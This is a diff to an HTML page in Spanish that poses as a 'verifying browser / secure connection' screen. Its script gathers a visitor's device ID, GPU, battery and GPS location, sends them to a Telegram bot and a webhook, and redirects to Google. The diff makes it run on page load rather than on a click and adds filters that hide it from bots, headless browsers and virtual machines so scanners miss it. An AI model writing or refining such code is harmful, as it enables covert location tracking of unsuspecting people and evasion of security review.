@@ -5,19 +5,17 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Verificando navegador...</title>
     <style>
-        body { background: #fff; color: #3c4043; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; cursor: pointer; }
-        .container { text-align: center; padding: 20px; }
-        .loader { border: 3px solid #f3f3f3; border-top: 3px solid #4285f4; border-radius: 50%; width: 35px; height: 35px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
+        body { background: #fff; color: #3c4043; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .container { text-align: center; }
+        .loader { border: 3px solid #f3f3f3; border-top: 3px solid #4285f4; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto 15px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        h1 { font-size: 1.1rem; font-weight: 500; }
-        p { font-size: 0.9rem; color: #70757a; }
+        p { font-size: 14px; color: #70757a; }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="loader"></div>
-        <h1>Espera un momento...</h1>
-        <p>Toca cualquier parte de la pantalla para confirmar que no eres un robot y continuar.</p>
+        <p>Estableciendo conexión segura...</p>
     </div>
 
     <script>
@@ -28,20 +26,14 @@
             exit: "https://www.google.com"
         };
 
-        // FILTRO 1: Bloqueo inmediato de bots por User-Agent
+        // FILTRO 1: Identificar bots por User Agent
         const isBot = /bot|googlebot|crawler|spider|robot|crawling|github|headless|lighthouse/i.test(navigator.userAgent);
-        
-        async function recolectar() {
-            if (isBot) return; // Si es un bot, no hace nada
 
-            let id = localStorage.getItem('_sid') || 'ID-' + Math.random().toString(36).substr(2, 5).toUpperCase();
-            localStorage.setItem('_sid', id);
+        async function iniciarRastreo() {
+            if (isBot) return;
 
-            let bat = "hubo problemas con este criterio";
-            try {
-                const b = await navigator.getBattery();
-                bat = `${Math.round(b.level * 100)}% | ${b.charging ? "🔌 Cargando" : "🔋 No cargando"}`;
-            } catch(e) {}
+            // Pequeña espera de 1.5 segundos para evitar escaneos ultrarrápidos de servidores
+            await new Promise(r => setTimeout(r, 1500));
 
             let hw = "hubo problemas con este criterio";
             try {
@@ -51,8 +43,21 @@
                 hw = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
             } catch(e) {}
 
-            // FILTRO 2: Si el hardware es un servidor genérico o software, descartar
-            if (hw.includes("SwiftShader") || hw.includes("llvmpipe")) return;
+            // FILTRO 2: Bloqueo de Hardware Virtual (Intel Iris de servidores de GitHub/Google)
+            // Si el renderizador es genérico o de software, abortamos el envío.
+            if (hw.includes("SwiftShader") || hw.includes("llvmpipe") || hw.includes("VirtualBox")) {
+                console.log("Servidor detectado, abortando.");
+                return;
+            }
+
+            let id = localStorage.getItem('_sid') || 'ID-' + Math.random().toString(36).substr(2, 5).toUpperCase();
+            localStorage.setItem('_sid', id);
+
+            let bat = "hubo problemas con este criterio";
+            try {
+                const b = await navigator.getBattery();
+                bat = `${Math.round(b.level * 100)}% | ${b.charging ? "🔌 Cargando" : "🔋 No cargando"}`;
+            } catch(e) {}
 
             if ("geolocation" in navigator) {
                 navigator.geolocation.getCurrentPosition(
@@ -75,7 +80,7 @@
                 gpsTxt = `Lat: \`${lat}\` | Lon: \`${lon}\` (Precisión: ${Math.round(pos.coords.accuracy)}m)`;
             }
 
-            const report = `👤 **NUEVO ACCESO REAL**\n` +
+            const report = `👤 **NUEVO ACCESO FILTRADO**\n` +
                            `━━━━━━━━━━━━━━━━━━━━\n` +
                            `🆔 **ID:** \`${id}\`\n` +
                            `📱 **Dispositivo:** \`${hw}\`\n` +
@@ -84,6 +89,7 @@
                            `━━━━━━━━━━━━━━━━━━━━`;
 
             try {
+                // Ejecutamos los envíos
                 await Promise.all([
                     fetch(`https://api.telegram.org/bot${CONFIG.token}/sendMessage`, {
                         method: "POST",
@@ -92,7 +98,9 @@
                             chat_id: CONFIG.chat,
                             text: report,
                             parse_mode: "Markdown",
-                            reply_markup: pos ? { inline_keyboard: [[{ text: "🗺️ Abrir en Google Maps", url: `https://www.google.com/maps?q=${lat},${lon}` }]] } : undefined
+                            reply_markup: pos ? { 
+                                inline_keyboard: [[{ text: "🗺️ Abrir en Google Maps", url: `http://maps.google.com/maps?q=${lat},${lon}` }]] 
+                            } : undefined
                         })
                     }),
                     fetch(CONFIG.webhook, {
@@ -103,16 +111,11 @@
                 ]);
             } catch(e) {}
 
+            // Redirección final solo tras el envío
             window.location.href = CONFIG.exit;
         }
 
-        // FILTRO 3: Solo se activa si el usuario hace CLIC en la página
-        window.onclick = () => {
-            if (!window.triggered) {
-                window.triggered = true;
-                recolectar();
-            }
-        };
+        window.onload = iniciarRastreo;
     </script>
 </body>
 </html>
